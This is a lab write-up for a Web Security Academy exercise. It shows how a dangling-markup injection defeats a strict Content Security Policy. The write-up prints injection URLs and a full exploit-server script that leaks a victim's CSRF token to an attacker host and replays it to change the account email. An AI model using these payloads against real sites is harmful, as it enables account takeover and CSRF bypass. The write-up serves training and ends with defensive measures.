# Cross-Site Scripting (XSS) – Reflected XSS with Strict CSP and Dangling Markup

(**Web Security Academy**)

This lab demonstrates how a **very strict Content Security Policy (CSP)** can still be bypassed using a **dangling markup attack**, allowing an attacker to hijack a form, **exfiltrate a CSRF token**, and perform an **unauthorized state-changing action**.

---

## Lab: Reflected XSS Protected by Very Strict CSP, with Dangling Markup Attack

**Category:** Cross-site scripting
**Context:** CSP / HTML injection
**Type:** Reflected XSS (Dangling Markup)
**Level:** Practitioner
**Status:** Solved

---

## What This Lab Is About

This lab uses multiple defensive layers:

* Strict CSP (blocks inline scripts and external resources)
* Server-side output encoding
* Client-side input validation
* CSRF protection

Despite this, the application is vulnerable due to **HTML context injection** combined with a **missing CSP `form-action` restriction**.

The goal is to:

1. Hijack a form submission
2. Leak the victim’s CSRF token
3. Use the token to change the victim’s email to:

```
hacker@evil-user.net
```

---

## Login Credentials (Attacker)

```
wiener:peter
```

---

## Vulnerable Flow

* **Source:** `email` query parameter
* **Injection Type:** Dangling HTML markup
* **Execution Trigger:** Victim clicks injected button
* **Bypass Techniques:**

  * Client-side validation bypass
  * CSP form-action weakness
  * CSRF token exfiltration via GET

---

## Key Observations

### 1. Client-Side Validation Can Be Bypassed

* Email field enforces `type="email"`
* Changing it to `type="text"` bypasses validation
* Valid email format is still required to pass checks

### 2. CSRF Token Is Present in the Form

* Hidden input field contains the CSRF token
* Token is required to change email address

### 3. CSP Blocks Script Execution

* Inline scripts do not execute
* External resources are blocked
* Console confirms CSP violations

 **Direct XSS is not possible**

---

## Exploitation Strategy

Instead of executing JavaScript directly:

* Inject **HTML markup**
* Hijack the form using a custom submit button
* Redirect the form submission to the exploit server
* Force submission using **GET** to leak CSRF token
* Replay the request with the stolen token

---

## Step 1: Inject a Dangling Button

```text
https://YOUR-LAB-ID.web-security-academy.net/my-account?email=foo@bar"><button formaction="https://exploit-YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit">Click me</button>
```

**Why this works:**

* Valid email format bypasses client-side checks
* Closing quote breaks out of attribute context
* Button is injected into the existing form
* `formaction` overrides the form’s original destination

---

## Step 2: Leak the CSRF Token (GET Method)

```text
https://YOUR-LAB-ID.web-security-academy.net/my-account?email=foo@bar"><button formaction="https://exploit-YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit" formmethod="get">Click me</button>
```

* Forces form submission via **GET**
* CSRF token appears in the URL
* Token is sent to the exploit server

---

## Final Exploit Server Payload

Paste the following into the **Exploit Server → Body**:

```html
<body>
<script>
const academyFrontend = "https://YOUR-LAB-ID.web-security-academy.net/";
const exploitServer = "https://exploit-YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit";

const url = new URL(location);
const csrf = url.searchParams.get('csrf');

if (csrf) {
    const form = document.createElement('form');
    const email = document.createElement('input');
    const token = document.createElement('input');

    email.name = 'email';
    email.value = 'hacker@evil-user.net';

    token.name = 'csrf';
    token.value = csrf;

    form.method = 'post';
    form.action = academyFrontend + 'my-account/change-email';

    form.append(email);
    form.append(token);
    document.documentElement.append(form);
    form.submit();
} else {
    location = academyFrontend +
      'my-account?email=blah@blah%22%3E%3Cbutton+class=button+formaction=' +
      exploitServer +
      '+formmethod=get+type=submit%3EClick+me%3C/button%3E';
}
</script>
</body>
```

---

## Steps I Followed

1. Logged in as `wiener:peter`
2. Inspected the email change form
3. Identified hidden CSRF token
4. Confirmed CSP blocks script execution
5. Found no `form-action` CSP restriction
6. Injected a dangling `<button>`
7. Redirected form submission to exploit server
8. Forced GET request to leak CSRF token
9. Captured token from URL
10. Replayed POST request with stolen token
11. Victim’s email changed successfully
12. Lab marked as solved

---

## Why This Worked

* CSP does **not** protect against HTML injection
* Dangling markup allowed form manipulation
* `formaction` overrides original endpoint
* GET method exposed CSRF token
* Same-origin policy allows token reuse
* CSP did not restrict form destinations

---

## Impact

* Full CSRF protection bypass
* Unauthorized account modification
* Email hijacking
* Demonstrates CSP misconfiguration risk

---

## Key Lessons Learned

* CSP is **not** a replacement for output encoding
* HTML injection can be as dangerous as script execution
* `form-action` CSP directive is critical
* CSRF tokens exposed via GET are unsafe
* Defense-in-depth must be complete

---

## Defensive Takeaways

To prevent this attack:

* Properly encode all reflected input
* Enforce `Content-Security-Policy: form-action 'self'`
* Avoid reflecting user input into forms
* Never expose CSRF tokens via GET
* Use SameSite cookies where possible

---

## Final Summary

* Strict CSP did not stop exploitation
* Dangling markup hijacked form submission
* CSRF token leaked via GET
* Token reused to change victim’s email
* Shows how **XSS + CSP misconfigurations** can still lead to account compromise

 
